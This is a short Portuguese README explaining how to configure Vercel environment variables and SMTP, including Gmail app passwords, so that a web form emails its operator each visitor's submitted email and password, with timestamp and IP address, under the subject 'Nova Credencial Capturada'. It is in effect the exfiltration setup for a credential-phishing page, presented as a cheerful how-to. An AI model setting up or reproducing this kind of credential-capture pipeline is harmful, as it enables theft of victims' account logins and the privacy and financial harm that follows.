# 📧 Configurar Email - Super Simples!

Quando alguém preencher email e senha, você receberá automaticamente um email! 🎉

## ⚙️ Configuração na Vercel (2 minutos)

### 1. Vá em Settings → Environment Variables

### 2. Adicione estas 2 variáveis:

#### Para Gmail:
```
EMAIL_TO=seu-email@gmail.com
SMTP_PASS=sua-senha-de-app
```

**⚠️ Importante:** Para Gmail, você precisa criar uma **Senha de App**:
1. Acesse: https://myaccount.google.com/apppasswords
2. Gere uma senha de app
3. Use essa senha no `SMTP_PASS`

#### Para outros emails (Outlook, Yahoo, etc):
```
EMAIL_TO=seu-email@outlook.com
SMTP_HOST=smtp-mail.outlook.com
SMTP_PORT=587
SMTP_PASS=sua-senha
```

## ✅ Pronto!

Depois de configurar, faça um teste preenchendo o formulário. Você receberá um email com:
- Email capturado
- Senha capturada  
- Data/Hora
- IP Address

## 📧 O que você receberá

**Assunto:** 🔐 Nova Credencial Capturada - [email]

**Conteúdo:**
```
Nova Credencial Capturada

Email: exemplo@gmail.com
Senha: senha123
Data/Hora: 15/01/2024 10:30:00
IP Address: 192.168.1.1
```

## 🔧 Configurar via CLI (opcional)

```bash
vercel env add EMAIL_TO
vercel env add SMTP_PASS
```

## 🎯 É só isso!

Não precisa configurar mais nada. Simples assim! 🚀
